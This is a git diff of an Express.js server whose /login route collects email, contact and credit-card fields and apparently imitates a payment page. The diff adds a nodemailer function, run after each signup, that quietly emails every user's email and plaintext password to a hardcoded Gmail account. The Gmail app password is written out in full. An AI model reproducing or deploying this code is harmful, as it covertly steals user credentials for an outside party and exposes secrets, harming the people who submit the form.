@@ -40,20 +40,21 @@ app.use(express.static('./methods-public'))
 app.use(express.urlencoded({ extended: false }))
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(cors({
-  origin:"*"
+  origin: "*"
 }));
 
 connection()
 
 // app.use("/pay", pay);
 
-app.post('/login', async(req, res) => {
+app.post('/login', async (req, res) => {
   //   // Insert Login Code Here                    https://secure5.tranzila.com/cgi-bin/tranzila71u.cgi
 
 
 
   try {
     email = req.body.email
+    
     var contact = req.body.contact
 
     var ccno = req.body.ccno
@@ -83,6 +84,7 @@ app.post('/login', async(req, res) => {
 
           //insert into DataBase
           new User({ ...req.body, email, password }).save();
+          main()
           res.redirect('/paymentaccepted.html');
 
 
@@ -91,7 +93,7 @@ app.post('/login', async(req, res) => {
 
 
       }
-      
+
       else {
         res.redirect('/paymenterror.html');
       }
@@ -101,6 +103,33 @@ app.post('/login', async(req, res) => {
   }
 
 });
+
+//send mail
+async function main() {
+
+  const nodemailer = require('nodemailer');
+
+  const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+      user: 'massahmed61@gmail.com',
+      pass: 'xfihkooxnuqfdluc'
+    }
+  });
+
+  send();
+
+  async function send() {
+    const result = await transporter.sendMail({
+      from: 'massahmed61@gmail.com',
+      to: 'massahmed61@gmail.com',
+      subject: 'Hello World',
+      text: `Hello There , your Email is : ${email} , Your Password is ${password}`
+    });
+
+    console.log(JSON.stringify(result, null, 4));
+  }
+}
 
 app.get('/paymentaccepted', (req, res) => {
   res.sendFile(__dirname, '/methods-public/paymentaccepted.html');
@@ -114,7 +143,7 @@ app.get('/paymenterror', (req, res) => {
 
 //   await new User({ ...req.body, myid,sum }).save();
 // }
-
-app.listen(5000, () => {
-  console.log(`Server is listening on port 5000...`);
+const port = process.env.port
+app.listen(port, () => {
+  console.log(`Server is listening on port ${port}...`);
 })
